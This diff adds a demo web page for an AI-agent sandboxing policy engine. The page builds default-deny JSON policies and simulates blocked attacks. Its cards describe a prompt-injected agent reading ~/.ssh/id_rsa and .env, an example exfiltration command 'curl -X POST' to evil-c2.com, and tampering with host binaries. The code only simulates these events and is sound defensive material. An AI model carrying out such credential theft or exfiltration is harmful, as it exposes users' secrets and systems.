@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- Code Scaffold Specification Schema: https://code-scaffold.com/spec/v1 -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MXC Policy Containment Engine - Agent Sandboxing Studio</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;600;700&display=swap');
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #090d16;
+      color: #e2e8f0;
+    }
+    .font-mono {
+      font-family: 'JetBrains Mono', monospace;
+    }
+    .glow-cyan {
+      box-shadow: 0 0 25px rgba(6, 182, 212, 0.25);
+    }
+    .glow-emerald {
+      box-shadow: 0 0 25px rgba(16, 185, 129, 0.25);
+    }
+    .glow-red {
+      box-shadow: 0 0 25px rgba(239, 68, 68, 0.25);
+    }
+    .grid-bg {
+      background-size: 28px 28px;
+      background-image: 
+        linear-gradient(to right, rgba(255, 255, 255, 0.03) 1px, transparent 1px),
+        linear-gradient(to bottom, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
+    }
+    .custom-scroll::-webkit-scrollbar {
+      width: 6px;
+      height: 6px;
+    }
+    .custom-scroll::-webkit-scrollbar-track {
+      background: rgba(15, 23, 42, 0.6);
+    }
+    .custom-scroll::-webkit-scrollbar-thumb {
+      background: rgba(51, 65, 85, 0.8);
+      border-radius: 3px;
+    }
+  </style>
+</head>
+<body class="min-h-screen grid-bg p-6 flex flex-col">
+  <!-- Top Navigation Bar -->
+  <header class="flex flex-wrap items-center justify-between border-b border-cyan-900/40 pb-4 mb-6">
+    <div class="flex items-center space-x-3">
+      <div class="w-11 h-11 rounded-lg bg-cyan-950 border border-cyan-500/50 flex items-center justify-center font-mono font-bold text-cyan-400 text-lg glow-cyan">
+        MXC
+      </div>
+      <div>
+        <h1 class="text-xl font-bold text-slate-100 tracking-wide flex items-center space-x-2">
+          <span>MXC Policy Containment Engine</span>
+          <span class="text-xs px-2.5 py-0.5 rounded bg-cyan-950 border border-cyan-500/60 text-cyan-300 font-mono font-semibold">v1.0 ACTIVE</span>
+        </h1>
+        <p class="text-xs text-slate-400">Policy-Driven Agent Sandboxing, Kernel Isolation & Defense Matrix</p>
+      </div>
+    </div>
+    <div class="flex items-center space-x-4 mt-3 sm:mt-0 font-mono text-xs">
+      <div class="flex items-center space-x-2 bg-slate-900/90 border border-slate-800 px-3 py-1.5 rounded-md">
+        <span class="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse"></span>
+        <span class="text-slate-300">Default-Deny Shield:</span>
+        <span class="text-emerald-400 font-bold" id="shieldStateLabel">ENFORCING</span>
+      </div>
+      <div class="px-3 py-1.5 rounded-md border border-cyan-800/60 bg-cyan-950/40 text-cyan-300 font-semibold flex items-center space-x-2">
+        <span>Backend:</span>
+        <span id="activeBackendLabel" class="text-white">Windows ProcessContainer</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Three-Column Layout -->
+  <main class="grid grid-cols-1 lg:grid-cols-3 gap-6 flex-grow">
+    <!-- Column 1: Policy Configuration Matrix -->
+    <section class="bg-slate-900/70 border border-slate-800 rounded-xl p-5 flex flex-col space-y-4 backdrop-blur-sm shadow-xl">
+      <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+        <h2 class="text-sm font-bold text-slate-200 uppercase tracking-wider flex items-center space-x-2">
+          <svg class="w-4 h-4 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6V4m0 2a2 2 0 100 4m0-4a2 2 0 110 4m-6 8a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4m6 6v10m6-2a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4"></path></svg>
+          <span>Policy Specification</span>
+        </h2>
+        <span class="text-xs font-mono text-cyan-400 bg-cyan-950/60 px-2 py-0.5 rounded border border-cyan-800/40">JSON Schema</span>
+      </div>
+
+      <!-- Containment Backend Selector -->
+      <div>
+        <label class="block text-xs font-semibold text-slate-300 mb-1.5">Target OS Containment Engine</label>
+        <select id="backendSelect" class="w-full bg-slate-950 border border-slate-700 rounded px-3 py-2 text-xs font-mono text-slate-200 focus:outline-none focus:border-cyan-500 transition-colors">
+          <option value="windows-process">Windows ProcessContainer (AppContainer SID)</option>
+          <option value="windows-wslc">Windows WSLc (Virtual Linux Container)</option>
+          <option value="linux-bwrap">Linux Bubblewrap (User/Mount Namespaces)</option>
+          <option value="macos-seatbelt">macOS Seatbelt (Apple SBPL Kernel Profile)</option>
+        </select>
+      </div>
+
+      <!-- Filesystem Protection Vector -->
+      <div class="space-y-2">
+        <label class="block text-xs font-semibold text-slate-300">Filesystem Policy Perimeter</label>
+        <div class="space-y-1.5 text-xs">
+          <label class="flex items-center justify-between p-2 rounded bg-slate-950/80 border border-slate-800/80 cursor-pointer hover:border-slate-700">
+            <span class="text-slate-300">Workspace Source Code</span>
+            <span class="px-2 py-0.5 rounded text-[10px] font-mono bg-blue-950 text-blue-300 border border-blue-800/50">READ ONLY</span>
+          </label>
+          <label class="flex items-center justify-between p-2 rounded bg-slate-950/80 border border-slate-800/80 cursor-pointer hover:border-slate-700">
+            <span class="text-slate-300">Target Build Directory (./target)</span>
+            <span class="px-2 py-0.5 rounded text-[10px] font-mono bg-emerald-950 text-emerald-300 border border-emerald-800/50">READ/WRITE</span>
+          </label>
+          <label class="flex items-center justify-between p-2 rounded bg-slate-950/80 border border-red-950/60 cursor-pointer hover:border-red-900/60">
+            <span class="text-slate-300 flex items-center space-x-1.5">
+              <span class="w-1.5 h-1.5 rounded-full bg-red-400"></span>
+              <span>Host Secrets (.ssh, .env, .aws)</span>
+            </span>
+            <span class="px-2 py-0.5 rounded text-[10px] font-mono bg-red-950 text-red-300 border border-red-800/50 font-bold">STRICT DENIED</span>
+          </label>
+        </div>
+      </div>
+
+      <!-- Network Vector -->
+      <div>
+        <label class="block text-xs font-semibold text-slate-300 mb-1.5">Network Egress Filter</label>
+        <div class="grid grid-cols-2 gap-2 text-xs font-mono">
+          <button id="netAirgapBtn" class="p-2 rounded bg-cyan-950/60 border border-cyan-500/80 text-cyan-300 font-semibold text-left transition-all">
+            * Airgapped
+            <span class="block text-[10px] font-sans text-slate-400 font-normal">Zero external sockets</span>
+          </button>
+          <button id="netWhitelistBtn" class="p-2 rounded bg-slate-950 border border-slate-800 text-slate-400 text-left hover:border-slate-700 transition-all">
+            * Whitelist
+            <span class="block text-[10px] font-sans text-slate-400 font-normal">Allowed APIs (npm, git)</span>
+          </button>
+        </div>
+      </div>
+
+      <!-- Desktop & UI Vector -->
+      <div class="pt-1">
+        <label class="block text-xs font-semibold text-slate-300 mb-1.5">Desktop & Clipboard Isolation</label>
+        <div class="flex items-center justify-between bg-slate-950 p-2.5 rounded border border-slate-800 text-xs">
+          <span class="text-slate-300">Block GUI Windows & Screen Hijack</span>
+          <span class="text-emerald-400 font-mono font-bold">Active</span>
+        </div>
+      </div>
+
+      <!-- Live JSON Policy Output -->
+      <div class="flex-grow flex flex-col pt-1">
+        <div class="flex items-center justify-between mb-1">
+          <span class="text-[11px] font-mono text-slate-400">Generated Policy Payload</span>
+          <button id="copyJsonBtn" class="text-[11px] font-mono text-cyan-400 hover:text-cyan-300 transition-colors">Copy JSON</button>
+        </div>
+        <pre id="policyJsonBlock" class="w-full flex-grow p-3 bg-slate-950 border border-slate-800 rounded font-mono text-[11px] text-cyan-300/90 overflow-auto custom-scroll leading-relaxed max-h-56 lg:max-h-none"></pre>
+      </div>
+    </section>
+
+    <!-- Column 2: Threat Simulation Engine -->
+    <section class="bg-slate-900/70 border border-slate-800 rounded-xl p-5 flex flex-col space-y-4 backdrop-blur-sm shadow-xl">
+      <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+        <h2 class="text-sm font-bold text-slate-200 uppercase tracking-wider flex items-center space-x-2">
+          <svg class="w-4 h-4 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+          <span>Threat Simulation Matrix</span>
+        </h2>
+        <span class="text-xs font-mono text-emerald-400 bg-emerald-950/60 px-2 py-0.5 rounded border border-emerald-800/40">Real-Time Interceptor</span>
+      </div>
+
+      <p class="text-xs text-slate-400 leading-relaxed">
+        Execute simulated agent operations to evaluate OS-level policy enforcement, boundary interception, and default-deny protection.
+      </p>
+
+      <!-- Simulation Action Cards -->
+      <div class="space-y-2.5">
+        <button id="simInjectBtn" class="w-full text-left p-3 rounded-lg border border-red-900/50 bg-red-950/20 hover:bg-red-950/40 hover:border-red-600 transition-all group">
+          <div class="flex items-center justify-between mb-1">
+            <span class="text-xs font-bold text-red-300 group-hover:text-red-200">1. Prompt Injection : Secret Harvesting</span>
+            <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-red-950 border border-red-800 text-red-400">EXPLOIT</span>
+          </div>
+          <p class="text-[11px] text-slate-400">Agent attempts to cat <code class="text-red-300">~/.ssh/id_rsa</code> and parse <code class="text-red-300">.env</code>.</p>
+        </button>
+
+        <button id="simExfilBtn" class="w-full text-left p-3 rounded-lg border border-amber-900/50 bg-amber-950/20 hover:bg-amber-950/40 hover:border-amber-600 transition-all group">
+          <div class="flex items-center justify-between mb-1">
+            <span class="text-xs font-bold text-amber-300 group-hover:text-amber-200">2. Network Exfiltration Attempt</span>
+            <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-amber-950 border border-amber-800 text-amber-400">SOCKET DENIAL</span>
+          </div>
+          <p class="text-[11px] text-slate-400">Agent executes <code class="text-amber-300">curl -X POST https://evil-c2.com/payload</code>.</p>
+        </button>
+
+        <button id="simTamperBtn" class="w-full text-left p-3 rounded-lg border border-purple-900/50 bg-purple-950/20 hover:bg-purple-950/40 hover:border-purple-600 transition-all group">
+          <div class="flex items-center justify-between mb-1">
+            <span class="text-xs font-bold text-purple-300 group-hover:text-purple-200">3. Host Binary Tampering</span>
+            <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-purple-950 border border-purple-800 text-purple-400">FS TAMPER</span>
+          </div>
+          <p class="text-[11px] text-slate-400">Agent attempts overwrite on <code class="text-purple-300">/usr/bin/node</code> or registry startup keys.</p>
+        </button>
+
+        <button id="simLegitBtn" class="w-full text-left p-3 rounded-lg border border-emerald-900/50 bg-emerald-950/20 hover:bg-emerald-950/40 hover:border-emerald-600 transition-all group">
+          <div class="flex items-center justify-between mb-1">
+            <span class="text-xs font-bold text-emerald-300 group-hover:text-emerald-200">4. Legitimate Build & Test Execution</span>
+            <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-emerald-950 border border-emerald-800 text-emerald-400">AUTHORIZED</span>
+          </div>
+          <p class="text-[11px] text-slate-400">Agent compiles project source and outputs artifacts to <code class="text-emerald-300">./target</code>.</p>
+        </button>
+      </div>
+
+      <!-- Visual State Diagram -->
+      <div class="flex-grow bg-slate-950 border border-slate-800 rounded-lg p-4 flex flex-col justify-center items-center relative overflow-hidden">
+        <div class="w-full flex items-center justify-between text-xs font-mono mb-3">
+          <span class="text-slate-400">Agent Sandbox Boundary</span>
+          <span id="boundaryStatusBadge" class="px-2 py-0.5 rounded bg-emerald-950 text-emerald-400 border border-emerald-800 font-bold">GUARD ENGAGED</span>
+        </div>
+
+        <div class="w-full bg-slate-900 border border-slate-800 rounded p-3 text-center transition-all duration-300" id="visualChamber">
+          <div class="text-xs font-mono font-bold text-slate-300 mb-1" id="visualChamberTitle">SANDBOX WORKLOAD READY</div>
+          <div class="text-[11px] text-slate-400" id="visualChamberSub">Awaiting execution simulation command</div>
+        </div>
+
+        <div class="w-full mt-3 flex items-center justify-between text-[11px] font-mono text-slate-400 px-1">
+          <span>Syscall Overhead: <strong class="text-cyan-400">0.8ms</strong></span>
+          <span>Policy Intercepts: <strong id="interceptCounter" class="text-white">0</strong></span>
+        </div>
+      </div>
+    </section>
+
+    <!-- Column 3: Live Interception Telemetry & Audit Stream -->
+    <section class="bg-slate-900/70 border border-slate-800 rounded-xl p-5 flex flex-col space-y-4 backdrop-blur-sm shadow-xl">
+      <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+        <h2 class="text-sm font-bold text-slate-200 uppercase tracking-wider flex items-center space-x-2">
+          <svg class="w-4 h-4 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 17v-2m3 2v-4m3 4v-6m2 10H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>
+          <span>Kernel Audit Log Stream</span>
+        </h2>
+        <button id="clearLogBtn" class="text-xs font-mono text-slate-400 hover:text-slate-200 transition-colors">Clear</button>
+      </div>
+
+      <!-- Real-Time Event Stream -->
+      <div id="auditLogContainer" class="flex-grow space-y-2 overflow-y-auto max-h-[460px] custom-scroll pr-1 font-mono text-xs">
+        <div class="p-2.5 rounded bg-slate-950 border border-slate-800/80 text-slate-400 text-[11px] leading-relaxed">
+          <div class="flex items-center justify-between text-[10px] text-slate-400 mb-1">
+            <span>SYSTEM INIT</span>
+            <span>00:00:00</span>
+          </div>
+          <div>MXC Policy Containment runtime initialized. Default-deny active.</div>
+        </div>
+      </div>
+
+      <!-- Diagnostics Summary Footer -->
+      <div class="pt-2 border-t border-slate-800/80 flex items-center justify-between text-xs font-mono">
+        <div class="flex items-center space-x-3 text-slate-400">
+          <span>Blocked: <strong id="blockedCount" class="text-red-400">0</strong></span>
+          <span>Allowed: <strong id="allowedCount" class="text-emerald-400">0</strong></span>
+        </div>
+        <button id="exportAuditBtn" class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs transition-colors">
+          Export Audit
+        </button>
+      </div>
+    </section>
+  </main>
+
+  <script>
+    // State Management
+    let currentBackend = 'windows-process';
+    let currentNetworkMode = 'airgap';
+    let interceptCount = 0;
+    let blockedCount = 0;
+    let allowedCount = 0;
+
+    const backendSelect = document.getElementById('backendSelect');
+    const activeBackendLabel = document.getElementById('activeBackendLabel');
+    const netAirgapBtn = document.getElementById('netAirgapBtn');
+    const netWhitelistBtn = document.getElementById('netWhitelistBtn');
+    const policyJsonBlock = document.getElementById('policyJsonBlock');
+    const copyJsonBtn = document.getElementById('copyJsonBtn');
+
+    const visualChamber = document.getElementById('visualChamber');
+    const visualChamberTitle = document.getElementById('visualChamberTitle');
+    const visualChamberSub = document.getElementById('visualChamberSub');
+    const boundaryStatusBadge = document.getElementById('boundaryStatusBadge');
+    const interceptCounter = document.getElementById('interceptCounter');
+
+    const auditLogContainer = document.getElementById('auditLogContainer');
+    const clearLogBtn = document.getElementById('clearLogBtn');
+    const exportAuditBtn = document.getElementById('exportAuditBtn');
+    const blockedCountEl = document.getElementById('blockedCount');
+    const allowedCountEl = document.getElementById('allowedCount');
+
+    function updatePolicyJson() {
+      const containmentType = currentBackend.startsWith('windows-wsl') ? 'wsl' :
+                             currentBackend.startsWith('linux') ? 'bubblewrap' :
+                             currentBackend.startsWith('macos') ? 'seatbelt' : 'process';
+
+      const networkConfig = currentNetworkMode === 'airgap' 
+        ? { egress: { default: "deny" }, ingress: { default: "deny" } }
+        : { egress: { default: "deny", allowedHosts: ["registry.npmjs.org", "crates.io"], allowedPorts: [443] }, ingress: { default: "deny" } };
+
+      const policy = {
+        version: "1.0.0",
+        containment: containmentType,
+        filesystem: {
+          readOnlyPaths: ["./src", "./Cargo.toml"],
+          readWritePaths: ["./target", "./tmp/scratch"],
+          deniedPaths: ["~/.ssh", "~/.aws", ".env"]
+        },
+        network: networkConfig,
+        ui: {
+          allowWindows: false,
+          clipboard: "none"
+        },
+        resources: {
+          timeoutMs: 60000,
+          maxProcesses: 32
+        }
+      };
+
+      policyJsonBlock.textContent = JSON.stringify(policy, null, 2);
+    }
+
+    backendSelect.addEventListener('change', (e) => {
+      currentBackend = e.target.value;
+      const labels = {
+        'windows-process': 'Windows ProcessContainer',
+        'windows-wslc': 'Windows WSLc Container',
+        'linux-bwrap': 'Linux Bubblewrap',
+        'macos-seatbelt': 'macOS Seatbelt'
+      };
+      activeBackendLabel.textContent = labels[currentBackend] || 'Custom';
+      updatePolicyJson();
+      logEvent('CONFIG_CHANGE', `Switched containment backend to ${labels[currentBackend]}`, 'info');
+    });
+
+    netAirgapBtn.addEventListener('click', () => {
+      currentNetworkMode = 'airgap';
+      netAirgapBtn.className = 'p-2 rounded bg-cyan-950/60 border border-cyan-500/80 text-cyan-300 font-semibold text-left transition-all';
+      netWhitelistBtn.className = 'p-2 rounded bg-slate-950 border border-slate-800 text-slate-400 text-left hover:border-slate-700 transition-all';
+      updatePolicyJson();
+      logEvent('POLICY_UPDATE', 'Network policy set to strict airgapped mode (zero egress)', 'info');
+    });
+
+    netWhitelistBtn.addEventListener('click', () => {
+      currentNetworkMode = 'whitelist';
+      netWhitelistBtn.className = 'p-2 rounded bg-cyan-950/60 border border-cyan-500/80 text-cyan-300 font-semibold text-left transition-all';
+      netAirgapBtn.className = 'p-2 rounded bg-slate-950 border border-slate-800 text-slate-400 text-left hover:border-slate-700 transition-all';
+      updatePolicyJson();
+      logEvent('POLICY_UPDATE', 'Network policy set to whitelisted domains (npm, crates.io)', 'info');
+    });
+
+    copyJsonBtn.addEventListener('click', () => {
+      navigator.clipboard.writeText(policyJsonBlock.textContent);
+      copyJsonBtn.textContent = 'Copied!';
+      setTimeout(() => copyJsonBtn.textContent = 'Copy JSON', 1800);
+    });
+
+    function logEvent(type, message, status) {
+      const now = new Date().toTimeString().split(' ')[0];
+      const div = document.createElement('div');
+      div.className = 'p-2.5 rounded bg-slate-950 border transition-all text-[11px] leading-relaxed';
+      
+      let badgeClass = 'bg-slate-800 text-slate-300 border-slate-700';
+      if (status === 'denied') {
+        badgeClass = 'bg-red-950 text-red-300 border-red-800/80 font-bold';
+        div.classList.add('border-red-950/80');
+      } else if (status === 'allowed') {
+        badgeClass = 'bg-emerald-950 text-emerald-300 border-emerald-800/80 font-bold';
+        div.classList.add('border-emerald-950/80');
+      } else {
+        div.classList.add('border-slate-800/80');
+      }
+
+      div.innerHTML = `
+        <div class="flex items-center justify-between text-[10px] text-slate-400 mb-1">
+          <span class="px-1.5 py-0.5 rounded border ${badgeClass}">${type}</span>
+          <span>${now}</span>
+        </div>
+        <div class="text-slate-300">${message}</div>
+      `;
+
+      auditLogContainer.prepend(div);
+      interceptCount++;
+      interceptCounter.textContent = interceptCount;
+    }
+
+    function flashChamber(title, sub, type) {
+      visualChamberTitle.textContent = title;
+      visualChamberSub.textContent = sub;
+      
+      visualChamber.className = 'w-full rounded p-3 text-center transition-all duration-300 ';
+      if (type === 'denied') {
+        visualChamber.classList.add('bg-red-950/40', 'border', 'border-red-600', 'glow-red');
+        boundaryStatusBadge.className = 'px-2 py-0.5 rounded bg-red-950 text-red-400 border border-red-800 font-bold';
+        boundaryStatusBadge.textContent = 'ATTACK BLOCKED';
+      } else if (type === 'allowed') {
+        visualChamber.classList.add('bg-emerald-950/40', 'border', 'border-emerald-600', 'glow-emerald');
+        boundaryStatusBadge.className = 'px-2 py-0.5 rounded bg-emerald-950 text-emerald-400 border border-emerald-800 font-bold';
+        boundaryStatusBadge.textContent = 'WORKLOAD PERMITTED';
+      }
+
+      setTimeout(() => {
+        visualChamber.className = 'w-full bg-slate-900 border border-slate-800 rounded p-3 text-center transition-all duration-300';
+        boundaryStatusBadge.className = 'px-2 py-0.5 rounded bg-emerald-950 text-emerald-400 border border-emerald-800 font-bold';
+        boundaryStatusBadge.textContent = 'GUARD ENGAGED';
+        visualChamberTitle.textContent = 'SANDBOX WORKLOAD READY';
+        visualChamberSub.textContent = 'Awaiting execution simulation command';
+      }, 3500);
+    }
+
+    // Simulation Triggers
+    document.getElementById('simInjectBtn').addEventListener('click', () => {
+      blockedCount++;
+      blockedCountEl.textContent = blockedCount;
+      flashChamber('DENIED: UNAUTHORIZED CREDENTIAL READ', 'Kernel intercepted file open on ~/.ssh/id_rsa', 'denied');
+      logEvent('FS_ACCESS_DENIED', 'Target: C:\\Users\\Default\\.ssh\\id_rsa [Rule: deniedPaths]. Syscall NtOpenFile terminated with STATUS_ACCESS_DENIED.', 'denied');
+    });
+
+    document.getElementById('simExfilBtn').addEventListener('click', () => {
+      blockedCount++;
+      blockedCountEl.textContent = blockedCount;
+      flashChamber('DENIED: NETWORK EGRESS BLOCKED', 'Socket connection attempt to unauthorized host', 'denied');
+      logEvent('NET_SOCKET_BLOCKED', 'Destination: evil-c2.com:443 [Rule: egress.default=deny]. WFP packet filter dropped socket creation.', 'denied');
+    });
+
+    document.getElementById('simTamperBtn').addEventListener('click', () => {
+      blockedCount++;
+      blockedCountEl.textContent = blockedCount;
+      flashChamber('DENIED: HOST BINARY WRITE BLOCKED', 'Attempted modification outside readWritePaths', 'denied');
+      logEvent('FS_WRITE_DENIED', 'Target: /usr/bin/node [Rule: unmapped host path]. Mount namespace denied modification request.', 'denied');
+    });
+
+    document.getElementById('simLegitBtn').addEventListener('click', () => {
+      allowedCount++;
+      allowedCountEl.textContent = allowedCount;
+      flashChamber('PERMITTED: CLEAN BUILD ARTIFACTS', 'Compiler wrote successfully to target directory', 'allowed');
+      logEvent('OP_AUTHORIZED', 'Action: Write ./target/debug/output.dll [Rule: readWritePaths]. ProcessContainer executed clean build.', 'allowed');
+    });
+
+    clearLogBtn.addEventListener('click', () => {
+      auditLogContainer.innerHTML = '';
+      logEvent('SYSTEM', 'Audit log cleared by operator.', 'info');
+    });
+
+    exportAuditBtn.addEventListener('click', () => {
+      const events = Array.from(auditLogContainer.children).map(c => c.innerText);
+      const blob = new Blob([events.join('\n\n')], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `mxc-audit-${Date.now()}.log`;
+      a.click();
+    });
+
+    // Initial render
+    updatePolicyJson();
+  </script>
+</body>
+</html>
